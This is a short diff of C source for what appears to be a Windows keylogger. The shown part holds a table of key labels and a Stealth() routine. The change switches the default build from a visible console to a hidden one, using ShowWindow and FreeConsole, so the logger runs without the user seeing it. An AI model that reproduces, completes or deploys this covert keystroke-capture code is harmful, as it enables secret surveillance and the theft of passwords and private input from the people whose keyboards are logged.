@@ -1,12 +1,12 @@
 #define UNICODE 
 #include <stdio.h>
-#include <stdlib.h>
+#include <stdlib.h> //not sure if I used this to lazy to check back through now maybe later
 #include <windows.h>
 #include <time.h>
 #include <string.h>
 #include <stdbool.h>
 
-#define visible
+#define hiden    //hiden/visable
 
 const char* keyname[] = {
      [VK_BACK] = "[BACKSPACE]",
@@ -128,7 +128,7 @@ void Stealth() {
     #if defined visible
         ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
     #endif
-    #if defined invisible
+    #if defined hiden
         ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
         FreeConsole();
     #endif
